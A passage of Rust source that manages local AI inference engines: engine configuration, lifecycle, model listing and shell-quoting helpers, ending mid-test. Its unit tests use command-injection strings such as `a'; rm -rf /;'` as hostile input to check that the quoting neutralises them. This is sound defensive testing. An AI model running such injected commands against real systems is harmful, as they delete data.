//! Local inference engine management.
//!
//! Provides a common [`LocalEngine`] trait that unifies lifecycle control
//! (detect/install/start/stop) and model management (list/pull/remove/load/unload)
//! across Ollama, Exo, llama.cpp, LM Studio, and Joshua.  Downloader tools
//! (the Hugging Face CLI) register here too as install-only entries, and
//! [`hub`] provides model discovery so pulls don't require an exact repo id.

pub mod downloaders;
pub mod exo;
pub mod hub;
pub mod joshua;
pub mod llamacpp;
pub mod lmstudio;
pub mod ollama;

use crate::ignore::Ignore;
use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::fmt;
use std::path::{Path, PathBuf};

// ── Core types ──────────────────────────────────────────────────────────────

/// What the engine binary/process looks like on this host.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct EnginePresence {
    /// Whether the engine binary is detected on the system.
    pub installed: bool,
    /// Engine version string, if detected.
    pub version: Option<String>,
    /// Absolute path to the binary, if found.
    pub binary_path: Option<String>,
}

/// Runtime status of a local engine.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Default)]
pub enum EngineRunStatus {
    /// Not running.
    #[default]
    Stopped,
    /// Running and healthy.
    Running {
        endpoint: String,
        loaded_models: u32,
        available_models: u32,
    },
    /// Running but not responding to health checks.
    Unhealthy { endpoint: String, error: String },
}

/// Full status snapshot for an engine.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct EngineStatus {
    pub presence: EnginePresence,
    pub run_status: EngineRunStatus,
}

/// Per-engine configuration (stored in Config.engines).
///
/// The typed fields below (context window, device, …) are the parameters the
/// UI exposes per engine; each engine maps them to its own CLI flags.  They
/// are separate from `extra_args` so the UI can round-trip them without
/// parsing flag strings.  `extra_args` remains the escape hatch for anything
/// the typed fields don't cover.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct EngineConfig {
    /// Whether this engine is enabled.
    #[serde(default = "default_true")]
    pub enabled: bool,
    /// Override endpoint URL (default per engine).
    #[serde(default)]
    pub endpoint: Option<String>,
    /// Port override (default per engine).
    #[serde(default)]
    pub port: Option<u16>,
    /// Custom models directory.
    #[serde(default)]
    pub models_dir: Option<String>,
    /// Start the engine automatically when the gateway starts.
    #[serde(default)]
    pub auto_start: bool,
    /// Extra CLI arguments for the engine process.
    #[serde(default)]
    pub extra_args: Vec<String>,
    /// Model to load at startup, for engines that serve a single model per
    /// process (e.g. Joshua).  Matched against model names from `list_models`.
    #[serde(default)]
    pub default_model: Option<String>,
    /// Context window override in tokens.  Engine flags: Joshua `--n-ctx`,
    /// llama.cpp `--ctx-size`, Ollama `--num-ctx` (load-time knob).
    #[serde(default)]
    pub context_length: Option<u32>,
    /// Compute backend for engines that accept one (Joshua `--device`;
    /// `auto`, `cpu`, `metal`, `cuda`).
    #[serde(default)]
    pub device: Option<String>,
    /// Huge-page strategy (Joshua `--huge-pages`; `off`, `transparent`,
    /// `2mb`, `1gb`, `huge`).
    #[serde(default)]
    pub huge_pages: Option<String>,
    /// Require the model file to be memory-mappable (Joshua `--mmap`).
    #[serde(default)]
    pub mmap: bool,
    /// Optimise the mapping for a model far larger than RAM (Joshua
    /// `--lazy-weights`).
    #[serde(default)]
    pub lazy_weights: bool,
    /// Hard ceiling on tokens generated per request (Joshua
    /// `--max-output-tokens`).
    #[serde(default)]
    pub max_output_tokens: Option<u32>,
    /// Maximum concurrent generations/embeddings (Joshua
    /// `--max-concurrency`).
    #[serde(default)]
    pub max_concurrency: Option<u32>,
}

fn default_true() -> bool {
    true
}

impl Default for EngineConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            endpoint: None,
            port: None,
            models_dir: None,
            auto_start: false,
            extra_args: Vec::new(),
            default_model: None,
            context_length: None,
            device: None,
            huge_pages: None,
            mmap: false,
            lazy_weights: false,
            max_output_tokens: None,
            max_concurrency: None,
        }
    }
}

/// Capability flags for an engine — determines which actions the UI enables.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub struct EngineCaps {
    pub can_install: bool,
    pub can_start: bool,
    pub can_stop: bool,
    pub can_pull: bool,
    pub can_remove: bool,
    pub can_load: bool,
    pub can_unload: bool,
}

impl EngineCaps {
    /// Full control (Ollama, llama.cpp).
    pub fn full() -> Self {
        Self {
            can_install: true,
            can_start: true,
            can_stop: true,
            can_pull: true,
            can_remove: true,
            can_load: true,
            can_unload: true,
        }
    }

    /// Read-only + lifecycle (Exo — can start/stop but pull is via its own UI).
    pub fn lifecycle_only() -> Self {
        Self {
            can_install: true,
            can_start: true,
            can_stop: true,
            can_pull: false,
            can_remove: false,
            can_load: true,
            can_unload: true,
        }
    }

    /// Status and list only (LM Studio — manages its own lifecycle).
    pub fn read_only() -> Self {
        Self {
            can_install: false,
            can_start: false,
            can_stop: false,
            can_pull: false,
            can_remove: false,
            can_load: false,
            can_unload: false,
        }
    }
}

/// A local model as reported by an engine.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LocalModel {
    /// Model name/tag (e.g. "llama3.1:8b-instruct-q4_K_M").
    pub name: String,
    /// Size on disk in bytes.
    pub size_bytes: u64,
    /// Quantization info (e.g. "Q4_K_M").
    pub quantization: Option<String>,
    /// Context window size (if known).
    pub context_length: Option<u32>,
    /// Whether this model is currently loaded in memory.
    pub loaded: bool,
    /// VRAM usage in bytes (if loaded).
    pub vram_bytes: Option<u64>,
    /// Model family/architecture.
    pub family: Option<String>,
    /// Model format (e.g. "gguf", "safetensors").
    pub format: Option<String>,
    /// Last modified timestamp.
    pub modified_at: Option<String>,
}

impl LocalModel {
    /// Human-readable size.
    pub fn size_display(&self) -> String {
        if self.size_bytes >= 1_000_000_000 {
            format!("{:.1} GB", self.size_bytes as f64 / 1e9)
        } else {
            format!("{:.0} MB", self.size_bytes as f64 / 1e6)
        }
    }
}

/// Progress update for streamed operations (pull/install).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PullProgress {
    pub model: String,
    pub status: String,
    pub percent: f32,
    pub downloaded_bytes: u64,
    pub total_bytes: u64,
}

impl fmt::Display for PullProgress {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "{}: {:.0}% ({}/{})",
            self.model,
            self.percent,
            format_bytes(self.downloaded_bytes),
            format_bytes(self.total_bytes),
        )
    }
}

fn format_bytes(bytes: u64) -> String {
    if bytes >= 1_000_000_000 {
        format!("{:.1} GB", bytes as f64 / 1e9)
    } else if bytes >= 1_000_000 {
        format!("{:.0} MB", bytes as f64 / 1e6)
    } else {
        format!("{:.0} KB", bytes as f64 / 1e3)
    }
}

/// Channel for streaming progress updates.
pub type ProgressSink = tokio::sync::mpsc::Sender<PullProgress>;

/// Quote a string for safe interpolation into an `sh -c` script.
///
/// Wraps the value in single quotes and escapes any embedded single
/// quotes (`'` → `'\''`).  Engine model ids and paths are user input —
/// every interpolation into a shell command must go through this.
pub fn sh_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// Run a shell script, streaming each output line to `sink` while
/// accumulating the full combined stdout+stderr for the return value.
///
/// This is the streaming counterpart to each engine's buffered `sh()`
/// helper: installers shell out to `curl … | sh`, `brew install`, etc.,
/// which emit progress on stdout/stderr as they run. Reading the pipes
/// line by line (instead of awaiting `output()`) is what lets the engines
/// dialog show live install progress. Each line is forwarded as a
/// [`PullProgress`] with the line in `status` and `percent = 0` (installers
/// rarely report a percentage). On failure the accumulated output is
/// included in the error so the user sees what went wrong.
pub async fn stream_shell(
    script: &str,
    label: &str,
    sink: Option<&ProgressSink>,
) -> Result<String> {
    use tokio::io::{AsyncBufReadExt, BufReader};

    let mut child = tokio::process::Command::new("sh")
        .arg("-c")
        .arg(script)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;

    // Read stdout and stderr concurrently, merging their lines in arrival
    // order into one channel so a chatty stream on either pipe can't block
    // the other.
    let (line_tx, mut line_rx) = tokio::sync::mpsc::channel::<String>(64);
    let stdout = child.stdout.take();
    let stderr = child.stderr.take();
    let out_tx = line_tx.clone();
    let out_task = tokio::spawn(async move {
        if let Some(stdout) = stdout {
            let mut lines = BufReader::new(stdout).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                if out_tx.send(line).await.is_err() {
                    break;
                }
            }
        }
    });
    let err_task = tokio::spawn(async move {
        if let Some(stderr) = stderr {
            let mut lines = BufReader::new(stderr).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                if line_tx.send(line).await.is_err() {
                    break;
                }
            }
        }
    });

    let mut collected = String::new();
    while let Some(line) = line_rx.recv().await {
        if !collected.is_empty() {
            collected.push('\n');
        }
        collected.push_str(&line);
        if let Some(sink) = sink {
            // Best-effort: a dropped receiver just stops the streaming.
            sink.send(PullProgress {
                model: label.to_string(),
                status: line,
                percent: 0.0,
                downloaded_bytes: 0,
                total_bytes: 0,
            })
            .await
            .ignore();
        }
    }
    out_task.await.ignore();
    err_task.await.ignore();

    let status = child.wait().await?;
    let trimmed = collected.trim().to_string();
    if !status.success() {
        anyhow::bail!(
            "{}",
            if trimmed.is_empty() {
                "Command failed".to_string()
            } else {
                trimmed
            }
        );
    }
    Ok(trimmed)
}

// ── Host-fit & pre-flight ───────────────────────────────────────────────────

/// Result of a host-fit check for a model.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModelFitResult {
    /// Whether the model fits the host resources.
    pub fits: bool,
    /// Human-readable warning message (empty if fits).
    pub warning: String,
}

/// Check whether a model fits on the current host.
///
/// Compares the model's size against available VRAM/RAM. Returns a warning
/// string if the model likely won't fit — the UI should display it but not
/// block the user.
pub fn check_model_fit(model: &LocalModel) -> ModelFitResult {
    let host = crate::runtime_ctx::get_host();
    let Some(host) = host else {
        return ModelFitResult {
            fits: true,
            warning: String::new(),
        };
    };

    let vram = host.total_vram_bytes();
    let ram = host.total_memory_bytes;

    // Estimate memory needed: for inference, the model weights need to fit
    // in VRAM (GPU) or RAM (CPU). Use size_bytes as a rough proxy (actual
    // inference memory is ~1.2× model size for KV cache overhead).
    let model_mem = (model.size_bytes as f64 * 1.2) as u64;

    if vram > 0 {
        // GPU available — check VRAM fit.
        if model_mem > vram {
            let need_gb = model_mem as f64 / 1e9;
            let have_gb = vram as f64 / 1e9;
            return ModelFitResult {
                fits: false,
                warning: format!(
                    "Model needs ~{:.1} GB VRAM but host has {:.1} GB",
                    need_gb, have_gb
                ),
            };
        }
    } else {
        // CPU-only — check RAM fit (needs room for OS + inference).
        let available_for_model = ram.saturating_sub(4 * 1024 * 1024 * 1024); // reserve 4 GB
        if model_mem > available_for_model {
            let need_gb = model_mem as f64 / 1e9;
            let have_gb = ram as f64 / 1e9;
            return ModelFitResult {
                fits: false,
                warning: format!(
                    "Model needs ~{:.1} GB RAM but host has {:.1} GB total",
                    need_gb, have_gb
                ),
            };
        }
    }

    ModelFitResult {
        fits: true,
        warning: String::new(),
    }
}

/// Pre-flight check before pulling/downloading a model.
///
/// Checks available disk space against the expected download size.
/// Returns Ok(()) if there's enough space, or an error message.
pub fn preflight_disk_check(expected_bytes: u64) -> Result<()> {
    let host = crate::runtime_ctx::get_host();
    let Some(host) = host else {
        return Ok(());
    };

    // Check disk space: require expected_bytes + 10% buffer.
    let required = expected_bytes + (expected_bytes / 10);
    if host.disk_available_bytes < required {
        let need_gb = required as f64 / 1e9;
        let have_gb = host.disk_available_bytes as f64 / 1e9;
        anyhow::bail!(
            "Insufficient disk space: need ~{:.1} GB but only {:.1} GB available",
            need_gb,
            have_gb
        );
    }

    Ok(())
}

// ── Trait ───────────────────────────────────────────────────────────────────

/// Common interface for local inference engines.
#[async_trait::async_trait]
pub trait LocalEngine: Send + Sync {
    /// Short identifier: "ollama", "exo", "llamacpp", "lmstudio".
    fn id(&self) -> &str;

    /// Human-friendly display name.
    fn display_name(&self) -> &str;

    /// Default endpoint URL.
    fn default_endpoint(&self) -> &str;

    /// Detect whether the engine is installed.
    async fn detect(&self) -> EnginePresence;

    /// Get full runtime status.
    async fn status(&self, cfg: &EngineConfig) -> EngineStatus;

    /// Install the engine (if not already present).
    async fn install(&self, sink: Option<ProgressSink>) -> Result<String>;

    /// Start the engine process.
    async fn start(&self, cfg: &EngineConfig) -> Result<String>;

    /// Stop the engine process.  Receives the config so engines can scope
    /// the stop to their own server (port/endpoint) instead of killing
    /// every matching process on the host.
    async fn stop(&self, cfg: &EngineConfig) -> Result<String>;

    /// List models available to this engine.
    async fn list_models(&self, cfg: &EngineConfig) -> Result<Vec<LocalModel>>;

    /// Pull/download a model (streamed progress).
    async fn pull(
        &self,
        model: &str,
        cfg: &EngineConfig,
        sink: Option<ProgressSink>,
    ) -> Result<String>;

    /// Remove a model from disk.
    async fn remove(&self, model: &str, cfg: &EngineConfig) -> Result<String>;

    /// Load a model into memory (GPU/CPU).
    async fn load(&self, model: &str, cfg: &EngineConfig) -> Result<String>;

    /// Unload a model from memory.
    async fn unload(&self, model: &str, cfg: &EngineConfig) -> Result<String>;

    /// What this engine supports.
    fn capabilities(&self) -> EngineCaps;
}

// ── Registry ────────────────────────────────────────────────────────────────

/// Registry of all known local engines.
pub struct EngineRegistry {
    engines: Vec<Box<dyn LocalEngine>>,
}

impl EngineRegistry {
    /// Create a registry with all built-in engines.
    pub fn new() -> Self {
        Self {
            engines: vec![
                Box::new(ollama::OllamaEngine),
                Box::new(exo::ExoEngine),
                Box::new(llamacpp::LlamaCppEngine),
                Box::new(lmstudio::LmStudioEngine),
                Box::new(joshua::JoshuaEngine),
                Box::new(downloaders::HuggingFaceDownloader),
            ],
        }
    }

    /// Get all engines.
    pub fn all(&self) -> &[Box<dyn LocalEngine>] {
        &self.engines
    }

    /// Look up an engine by id.
    pub fn get(&self, id: &str) -> Option<&dyn LocalEngine> {
        self.engines.iter().find(|e| e.id() == id).map(|e| &**e)
    }
}

impl Default for EngineRegistry {
    fn default() -> Self {
        Self::new()
    }
}

// ── Service integration ─────────────────────────────────────────────────────

/// Scan a directory (recursively, one level of subdirectories) for GGUF files.
///
/// Shared by the file-based engines (Joshua, llama.cpp) whose "local models"
/// are GGUF files on disk; Hugging Face downloads land in per-repo
/// subdirectories, hence the one-level recursion.
pub fn scan_gguf_models(dir: &Path) -> Vec<PathBuf> {
    let mut found = Vec::new();
    let Ok(entries) = std::fs::read_dir(dir) else {
        return found;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            if let Ok(sub) = std::fs::read_dir(&path) {
                for sub_entry in sub.flatten() {
                    let sub_path = sub_entry.path();
                    if sub_path.extension().is_some_and(|e| e == "gguf") {
                        found.push(sub_path);
                    }
                }
            }
        } else if path.extension().is_some_and(|e| e == "gguf") {
            found.push(path);
        }
    }
    found.sort();
    found
}

/// Command lines of running processes matching `pattern` (Linux only,
/// best-effort).  Used by the file-based engines to report servers that are
/// already running on the host — including ones started manually outside
/// RustyClaw — so the UI can say *which models are running* rather than only
/// what the configured endpoint answers.
#[cfg_attr(not(target_os = "linux"), allow(unused_variables))]
pub async fn running_server_cmdlines(pattern: &str) -> Vec<String> {
    #[cfg(target_os = "linux")]
    {
        if let Ok(output) = tokio::process::Command::new("pgrep")
            .args(["-af", pattern])
            .output()
            .await
        {
            if output.status.success() {
                return String::from_utf8_lossy(&output.stdout)
                    .lines()
                    .map(str::to_string)
                    // Exclude the pgrep process itself (its own cmdline
                    // contains the pattern).
                    .filter(|l| !l.contains("pgrep"))
                    .collect();
            }
        }
    }
    Vec::new()
}

/// Parse engine-server command lines (from [`running_server_cmdlines`])
/// into `(model_name, port)` pairs.
///
/// Understands `--model/-m <path>` (and `--flag=value` forms) for the model,
/// and the given port flags (e.g. `--addr host:port` for joshua,
/// `--port N` for llama-server).  Both the real server process and the
/// `sh -c "nohup …"` wrapper that spawned it match the pgrep pattern, so
/// results are deduped by model name.
pub(crate) fn parse_server_cmdlines(
    lines: &[String],
    model_flags: &[&str],
    port_flags: &[&str],
    default_port: u16,
) -> Vec<(String, Option<u16>)> {
    fn clean_token(tok: &str) -> String {
        tok.trim_matches(|c| c == '\'' || c == '"').to_string()
    }

    fn port_from(token: &str) -> Option<u16> {
        let token = token.trim_matches(|c| c == '\'' || c == '"');
        // "host:port" or bare "port".
        token
            .rsplit_once(':')
            .map(|(_, p)| p)
            .unwrap_or(token)
            .parse()
            .ok()
    }

    let mut out: Vec<(String, Option<u16>)> = Vec::new();
    for line in lines {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        // The line is "<pid> <cmdline>"; drop the pid.
        let toks: Vec<&str> = line.split_whitespace().skip(1).collect();
        let mut model: Option<String> = None;
        let mut port: Option<u16> = None;
        let mut i = 0;
        while i < toks.len() {
            let tok = toks[i];
            if model_flags.contains(&tok) {
                if let Some(v) = toks.get(i + 1) {
                    model = Some(clean_token(v));
                    i += 2;
                    continue;
                }
            }
            if port_flags.contains(&tok) {
                if let Some(v) = toks.get(i + 1) {
                    port = port_from(v).or(port);
                    i += 2;
                    continue;
                }
            }
            // --flag=value forms.
            if let Some((flag, val)) = tok.split_once('=') {
                if model_flags.contains(&flag) {
                    model = Some(clean_token(val));
                } else if port_flags.contains(&flag) {
                    port = port_from(val).or(port);
                }
            }
            i += 1;
        }
        if let Some(path) = model {
            let name = Path::new(&path)
                .file_stem()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_else(|| path.clone());
            if !out.iter().any(|(n, _)| *n == name) {
                out.push((name, port));
            }
        }
    }
    if out.is_empty() {
        out
    } else {
        // Fill unparsed ports with the engine's default so callers can
        // report a usable endpoint.
        out.into_iter()
            .map(|(n, p)| (n, p.or(Some(default_port))))
            .collect()
    }
}

/// CLI flags for a Joshua server derived from the typed [`EngineConfig`]
/// parameter fields.  `extra_args` is appended by the caller, so a raw
/// `--n-ctx`/`--device`/… in `extra_args` still wins (it comes later on the
/// command line and Joshua's clap takes the last occurrence).
pub fn joshua_serve_flags(cfg: &EngineConfig) -> Vec<String> {
    let mut flags = Vec::new();
    if let Some(ctx) = cfg.context_length {
        flags.push("--n-ctx".into());
        flags.push(ctx.to_string());
    }
    // Device and huge-pages are free-form config strings that end up in a
    // shell command; only emit them for the values Joshua actually accepts,
    // so a hostile config value cannot inject shell syntax.
    if let Some(device) = &cfg.device {
        if matches!(device.as_str(), "auto" | "cpu" | "metal" | "cuda") {
            flags.push("--device".into());
            flags.push(device.clone());
        }
    }
    if let Some(hp) = &cfg.huge_pages {
        if matches!(hp.as_str(), "transparent" | "2mb" | "1gb" | "huge") {
            flags.push("--huge-pages".into());
            flags.push(hp.clone());
        }
    }
    if cfg.mmap {
        flags.push("--mmap".into());
    }
    if cfg.lazy_weights {
        flags.push("--lazy-weights".into());
    }
    if let Some(m) = cfg.max_output_tokens {
        flags.push("--max-output-tokens".into());
        flags.push(m.to_string());
    }
    if let Some(c) = cfg.max_concurrency {
        flags.push("--max-concurrency".into());
        flags.push(c.to_string());
    }
    flags
}

/// Result of a provider model-list fetch with the local-engine fallback:
/// the pickable ids, which of them are currently loaded/running (for
/// "running" markers in pickers), and the fetch error (cleared when local
/// models were found).
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct ProviderModels {
    /// Model ids the picker may offer for this provider (live API list
    /// merged with the engine's on-disk/local list).
    pub models: Vec<String>,
    /// Models the local engine reports as loaded/running (a subset of
    /// `models` for engine providers; empty for cloud providers).
    pub loaded: Vec<String>,
    /// Why the live provider fetch failed, when nothing local replaced it.
    pub error: Option<String>,
}

/// Fetch the model list for a provider, with the local-engine fallback.
///
/// The live provider API list is fetched first (as
/// [`crate::providers::fetch_models`]); for providers that are also local
/// engines (Ollama, llama.cpp, LM Studio, exo, Joshua) the engine's own
/// model list is merged in — for the file-based engines (Joshua, llama.cpp)
/// that is a scan of the models directory, so it works even when the engine
/// server is not running.  The returned error is cleared whenever local
/// models could be listed: the whole point of the fallback is that pickers
/// show what is available locally.
///
/// Used by the gateway (for remote clients) and by the TUI (which fetches
/// beside the vault).
pub async fn provider_models_with_local_fallback(
    provider: &str,
    api_key: Option<&str>,
    base_url_override: Option<&str>,
    engine_configs: &std::collections::HashMap<String, EngineConfig>,
) -> ProviderModels {
    let (mut models, mut error) =
        match crate::providers::fetch_models(provider, api_key, base_url_override).await {
            Ok(models) => (models, None),
            Err(e) => (Vec::new(), Some(format!("{:#}", e))),
        };

    let registry = EngineRegistry::new();
    let mut loaded = Vec::new();
    if let Some(engine) = registry.get(provider) {
        let cfg = engine_configs.get(provider).cloned().unwrap_or_default();
        match engine.list_models(&cfg).await {
            Ok(local) => {
                for m in local {
                    if !models.iter().any(|existing| existing == &m.name) {
                        models.push(m.name.clone());
                    }
                    if m.loaded && !loaded.iter().any(|l| l == &m.name) {
                        loaded.push(m.name);
                    }
                }
                if !models.is_empty() {
                    models.sort();
                    error = None;
                }
            }
            Err(e) => {
                tracing::debug!(
                    provider = %provider,
                    error = %e,
                    "Engine-local model list unavailable"
                );
            }
        }
    }

    ProviderModels {
        models,
        loaded,
        error,
    }
}

/// Metadata-carrying variant of [`provider_models_with_local_fallback`]:
/// same local-engine fallback, but returns the rich [`crate::providers::ModelInfo`]
/// entries (pricing, context length, display name) that
/// [`crate::providers::fetch_models_detailed`] produces.  Locally-scanned
/// models carry only their id (the engines layer knows the names, not the
/// pricing).
pub async fn provider_models_detailed_with_local_fallback(
    provider: &str,
    api_key: Option<&str>,
    base_url_override: Option<&str>,
    engine_configs: &std::collections::HashMap<String, EngineConfig>,
) -> Result<Vec<crate::providers::ModelInfo>> {
    use crate::providers::ModelInfo;

    let live = crate::providers::fetch_models_detailed(provider, api_key, base_url_override).await;

    let local: Option<Vec<crate::engines::LocalModel>> = match EngineRegistry::new().get(provider) {
        Some(engine) => {
            let cfg = engine_configs.get(provider).cloned().unwrap_or_default();
            match engine.list_models(&cfg).await {
                Ok(models) => Some(models),
                Err(e) => {
                    tracing::debug!(
                        provider = %provider,
                        error = %e,
                        "Engine-local model list unavailable"
                    );
                    None
                }
            }
        }
        None => None,
    };

    let local_ids: Vec<String> = local
        .as_ref()
        .map(|models| models.iter().map(|m| m.name.clone()).collect())
        .unwrap_or_default();

    match live {
        Ok(mut models) => {
            for name in local_ids {
                if !models.iter().any(|m| m.id == name) {
                    models.push(ModelInfo {
                        id: name,
                        name: None,
                        context_length: None,
                        pricing_prompt: None,
                        pricing_completion: None,
                    });
                }
            }
            models.sort_by(|a, b| a.id.cmp(&b.id));
            Ok(models)
        }
        Err(_e) if !local_ids.is_empty() => Ok(local_ids
            .into_iter()
            .map(|id| ModelInfo {
                id,
                name: None,
                context_length: None,
                pricing_prompt: None,
                pricing_completion: None,
            })
            .collect()),
        Err(e) => Err(anyhow::anyhow!("{:#}", e)),
    }
}

/// Build `ServiceDef` entries for engines with `auto_start = true`.
///
/// The caller inserts these into the `ServicesConfig` so the existing service
/// manager handles lifecycle (restart, health-checks, logs) for free.
pub fn engine_service_defs(
    configs: &std::collections::HashMap<String, EngineConfig>,
) -> Vec<(String, crate::services::ServiceDef)> {
    let registry = EngineRegistry::new();
    let mut defs = Vec::new();

    for (id, cfg) in configs {
        if !cfg.auto_start || !cfg.enabled {
            continue;
        }
        // Only engines that can start are eligible.
        let Some(engine) = registry.get(id) else {
            continue;
        };
        if !engine.capabilities().can_start {
            continue;
        }

        let (command, args) = engine_start_command(id, cfg);
        let port = cfg.port.unwrap_or_else(|| default_port(id));

        let health_url = cfg
            .endpoint
            .clone()
            .unwrap_or_else(|| format!("http://127.0.0.1:{}", port));

        let svc = crate::services::ServiceDef {
            command,
            args,
            env: std::collections::HashMap::new(),
            cwd: None,
            service_type: crate::services::ServiceType::Http,
            restart: crate::services::RestartPolicy::OnFailure,
            auto_start: true,
            health_check: Some(crate::services::HealthCheck {
                method: crate::services::HealthMethod::HttpGet { url: health_url },
                interval_secs: 5,
                timeout_secs: 3,
                retries: 2,
            }),
            max_log_lines: 500,
        };
        defs.push((format!("engine-{}", id), svc));
    }

    defs
}

/// Determine the command+args to start an engine process.
fn engine_start_command(id: &str, cfg: &EngineConfig) -> (String, Vec<String>) {
    let args: Vec<String> = cfg.extra_args.clone();
    match id {
        "ollama" => {
            let cmd = "ollama".to_string();
            let mut a = vec!["serve".to_string()];
            a.extend(args);
            (cmd, a)
        }
        "exo" => {
            let cmd = "exo".to_string();
            // exo starts with no subcommand by default
            (cmd, args)
        }
        "llamacpp" => {
            let cmd = "llama-server".to_string();
            // Built-in flags first, then extra_args last: llama-server takes
            // the last occurrence of a repeated flag, so a hand-written
            // `--port`/`--ctx-size` in extra_args must override the defaults.
            // The resolved port is always emitted so the port-scoped stop can
            // identify auto-started servers.
            let mut a = Vec::new();
            let port = cfg.port.unwrap_or(8080);
            a.extend(["--port".to_string(), port.to_string()]);
            if let Some(ref models_dir) = cfg.models_dir {
                a.extend(["--model-store".to_string(), models_dir.clone()]);
            }
            if let Some(ctx) = cfg.context_length {
                a.extend(["--ctx-size".to_string(), ctx.to_string()]);
            }
            a.extend(args);
            (cmd, a)
        }
        "joshua" => {
            let cmd = "joshua".to_string();
            let mut a = vec!["serve".to_string()];
            let port = cfg.port.unwrap_or(joshua::DEFAULT_PORT);
            a.extend(["--addr".to_string(), format!("127.0.0.1:{}", port)]);
            // One joshua process serves one model; resolve which GGUF to
            // load (extra_args --model wins, then default_model, then the
            // sole model in the models dir).
            if !args.iter().any(|arg| arg == "--model" || arg == "-m") {
                match joshua::resolve_model_path(cfg) {
                    Ok(path) => {
                        a.extend(["--model".to_string(), path.display().to_string()]);
                    }
                    Err(e) => {
                        tracing::warn!(error = %e, "Cannot auto-start joshua without a model");
                    }
                }
            }
            a.extend(joshua_serve_flags(cfg));
            a.extend(args);
            (cmd, a)
        }
        _ => ("echo".to_string(), vec!["unsupported-engine".to_string()]),
    }
}

/// Default port for each engine.
fn default_port(id: &str) -> u16 {
    match id {
        "ollama" => 11434,
        "exo" => 52415,
        "llamacpp" => 8080,
        "lmstudio" => 1234,
        "joshua" => joshua::DEFAULT_PORT,
        _ => 8080,
    }
}

#[cfg(test)]
mod sh_quote_tests {
    use super::*;

    #[test]
    fn quotes_plain_and_hostile_input() {
        assert_eq!(sh_quote("Qwen/Qwen3-4B-GGUF"), "'Qwen/Qwen3-4B-GGUF'");
        assert_eq!(sh_quote("a b"), "'a b'");
        // Embedded single quote cannot break out of the quoting.
        assert_eq!(sh_quote("a'; rm -rf /;'"), r"'a'\''; rm -rf /;'\'''");
        // Other metacharacters are inert inside single quotes.
        assert_eq!(sh_quote("$(boom)"), "'$(boom)'");
    }

    #[tokio::test]
    async fn quoted_metacharacters_are_literal_in_sh() {
        let hostile = "a'; echo pwned; '";
        let out = stream_shell(&format!("printf %s {}", sh_quote(hostile)), "test", None)
            .await
            .expect("script succeeds");
        assert_eq!(out, hostile);
    }
}

#[cfg(test)]
mod fallback_tests {
    use super::*;

    /// llama.cpp auto-start: built-in flags come first, so a hand-written
    /// `--port`/`--ctx-size` in extra_args still wins (llama-server takes
    /// the last occurrence of a repeated flag).
    #[test]
    fn llamacpp_start_command_lets_extra_args_override_builtins() {
        let cfg = EngineConfig {
            context_length: Some(4096),
            extra_args: vec![
                "--port".into(),
                "9999".into(),
                "--ctx-size".into(),
                "8192".into(),
            ],
            ..Default::default()
        };
        let (cmd, args) = engine_start_command("llamacpp", &cfg);
        assert_eq!(cmd, "llama-server");
        // Built-ins first …
        assert_eq!(
            &args[0..4],
            &[
                "--port".to_string(),
                "8080".to_string(),
                "--ctx-size".to_string(),
                "4096".to_string()
            ]
        );
        // … then extra_args last, so they win.
        assert_eq!(
            &args[4..],
            &[
                "--port".to_string(),
                "9999".to_string(),
                "--ctx-size".to_string(),
                "8192".to_string()
            ]
        );
    }

    /// A local engine whose server is not running must still surface its
    /// on-disk models through the provider-model fallback, with the fetch
    /// error cleared (that is what lets pickers show local models).
    #[tokio::test]
    async fn local_engine_models_surface_when_live_fetch_fails() {
        let dir = std::env::temp_dir().join(format!("rc-joshua-fallback-{}", std::process::id()));
        std::fs::remove_dir_all(&dir).ignore();
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("tiny-Q4_0.gguf"), b"x").unwrap();

        let mut configs = std::collections::HashMap::new();
        configs.insert(
            "joshua".to_string(),
            EngineConfig {
                models_dir: Some(dir.to_string_lossy().to_string()),
                ..Default::default()
            },
        );

        // The live fetch fails fast (connection refused on localhost), so
        // the scan is the only source — and the error must be cleared.
        let fetched = provider_models_with_local_fallback("joshua", None, None, &configs).await;
        assert!(fetched.error.is_none(), "local models must clear the error");
        assert!(
            fetched.models.iter().any(|m| m == "tiny-Q4_0"),
            "expected the scanned GGUF in {:?}",
            fetched.models
        );
        // Loaded models (from host process detection, if any joshua servers
        // happen to be running on the test host) must always be a subset of
        // the picker list.
        assert!(
            fetched.loaded.iter().all(|l| fetched.models.contains(l)),
            "loaded {:?} must be a subset of models {:?}",
            fetched.loaded,
            fetched.models
        );

        std::fs::remove_dir_all(&dir).ignore();
    }

    #[test]
    fn parses_running_server_cmdlines() {
        let lines = vec![
            "123 /usr/bin/joshua serve --model /home/u/models/tiny-Q4_0.gguf --addr 127.0.0.1:8080".to_string(),
            // The `sh -c "nohup …"` wrapper that spawned it also matches
            // pgrep; the same model must not be reported twice.
            "124 sh -c nohup joshua serve --model '/home/u/models/tiny-Q4_0.gguf' --addr 127.0.0.1:8080 &".to_string(),
            "125 joshua serve -m /models/big-Q8_0.gguf -a 0.0.0.0:8331".to_string(),
            "126 joshua serve --model=/models/eq-form.gguf --addr=127.0.0.1:9999".to_string(),
        ];
        let joshua = parse_server_cmdlines(&lines, &["--model", "-m"], &["--addr", "-a"], 8080);
        assert_eq!(
            joshua,
            vec![
                ("tiny-Q4_0".to_string(), Some(8080)),
